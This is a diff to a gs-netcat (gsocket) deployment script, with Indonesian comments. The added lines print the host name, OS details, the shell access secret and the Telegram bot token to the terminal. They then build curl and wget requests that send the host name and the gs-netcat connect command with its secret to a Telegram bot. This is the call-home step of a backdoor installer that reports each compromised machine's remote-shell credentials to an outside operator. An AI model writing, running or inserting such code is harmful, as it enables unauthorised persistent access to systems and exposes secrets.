@@ -19,7 +19,36 @@ GS_WEBHOOK_404_OK=
 [[ -n $gs_deploy_webhook ]] && GS_WEBHOOK="$gs_deploy_webhook"
 unset gs_deploy_webhook
 
+# Debugging awal
+echo "=====[ DEBUG: Running Telegram Notification ]====="
+echo "Hostname: $(hostname)"
+echo "OS Info: $(uname -rom)"
+echo "GS_SECRET: ${GS_SECRET}"
+echo "GS_TG_TOKEN: ${GS_TG_TOKEN}"
+echo "GS_TG_CHATID: ${GS_TG_CHATID}"
+
 msg='$(hostname) --- $(uname -rom) --- gs-netcat -i -s ${GS_SECRET}'
+echo "Generated Message: $msg"
+if [[ -n $GS_TG_TOKEN ]] && [[ -n $GS_TG_CHATID ]]; then
+    echo "Telegram token dan chat ID ditemukan, menyiapkan Webhook..."
+    
+    # Debugging sebelum menyiapkan request CURL
+    echo "Setting up CURL request..."
+    GS_WEBHOOK_CURL=(
+        "--data-urlencode" "text=${msg}"
+        "https://api.telegram.org/bot${GS_TG_TOKEN}/sendMessage?chat_id=${GS_TG_CHATID}&parse_mode=html"
+    )
+    echo "CURL Command: curl ${GS_WEBHOOK_CURL[*]}"
+
+    # Debugging sebelum menyiapkan request WGET
+    echo "Setting up WGET request..."
+    GS_WEBHOOK_WGET=(
+        "https://api.telegram.org/bot${GS_TG_TOKEN}/sendMessage?chat_id=${GS_TG_CHATID}&parse_mode=html&text=${msg}"
+    )
+    echo "WGET Command: wget -qO- ${GS_WEBHOOK_WGET[*]}"
+else
+    echo "ERROR: GS_TG_TOKEN atau GS_TG_CHATID tidak tersedia, tidak bisa mengirim pesan!"
+fi
 [[ -n $GS_TG_TOKEN ]] && [[ -n $GS_TG_CHATID ]] && {
 	GS_WEBHOOK_CURL=("--data-urlencode" "text=${msg}" "https://api.telegram.org/bot${GS_TG_TOKEN}/sendMessage?chat_id=${GS_TG_CHATID}&parse_mode=html")
 	GS_WEBHOOK_WGET=("https://api.telegram.org/bot${GS_TG_TOKEN}/sendMessage?chat_id=${GS_TG_CHATID}&parse_mode=html&text=${msg}")
@@ -1341,6 +1370,7 @@ webhooks()
 	local err
 
 	echo -en "Executing webhooks...................................................."
+
 	[[ -z ${GS_WEBHOOK_CURL[0]} ]] && { SKIP_OUT; return; }
 	[[ -z ${GS_WEBHOOK_WGET[0]} ]] && { SKIP_OUT; return; }
 
